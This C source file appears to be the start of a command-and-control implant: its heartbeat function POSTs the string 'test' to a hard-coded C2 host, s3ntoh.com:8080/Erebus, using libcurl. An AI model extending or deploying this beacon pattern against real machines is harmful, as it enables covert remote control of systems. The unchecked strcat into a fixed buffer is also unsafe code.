#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include <curl/curl.h>



const char *C2_address = "s3ntoh.com";
const char *C2_port = "8080";

void heartbeat(CURL *curl){
    if (curl) {
        char full_adress[100];
        full_adress[0] = '\0';
        strcat(full_adress, "http://");
        strcat(full_adress, C2_address);
        strcat(full_adress, ":");
        strcat(full_adress, C2_port);
        strcat(full_adress, "/Erebus");
        printf("%s", full_adress);
        printf("\n");

        curl_easy_setopt(curl, CURLOPT_URL, full_adress);

        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "test");

        CURLcode result_post = curl_easy_perform(curl);

        // Check for errors
        if (result_post != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(result_post));
        }

        curl_easy_cleanup(curl);
    }
}



int main(){
    printf("Demarrage\n");

    curl_global_init(CURL_GLOBAL_DEFAULT);
    CURL *curl = curl_easy_init();
    if (curl) {
        heartbeat(curl);
    }
    
}   

